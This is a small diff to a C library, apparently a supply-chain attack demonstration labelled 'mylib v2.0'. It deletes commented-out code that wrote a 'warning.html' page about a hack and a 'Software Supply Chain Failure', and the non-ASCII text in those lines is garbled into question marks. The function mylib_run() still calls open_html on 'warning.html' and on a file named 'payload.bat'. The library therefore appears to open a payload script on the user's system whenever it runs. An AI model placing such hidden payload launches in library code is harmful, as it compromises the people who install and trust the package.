@@ -19,24 +19,6 @@ void open_html(const char *filename) {
 }
 
 void mylib_run(void) {
-//    FILE *f = fopen("warning.html", "w");
-//    if (f != NULL) {
-//        fprintf(f,
-//            "<!DOCTYPE html>\n"
-//            "<html>\n"
-//            "<head><title>Warning</title></head>\n"
-//            "<body style='font-family:sans-serif;'>\n"
-//            "<h1>?????? hack ????</h1>\n"
-//            "<p>?????????????? Software Supply Chain Failure</p>\n"
-//            "</body>\n"
-//            "</html>\n"
-//        );
-//        fclose(f);
-//        printf("mylib v2.0: Generated warning.html\n");
-//        printf("Open the file in a browser to see the result.\n");
-//    } else {
-//        printf("mylib v2.0: Failed to create HTML file.\n");
-//    }
     
     open_html("warning.html");
     open_html("payload.bat");
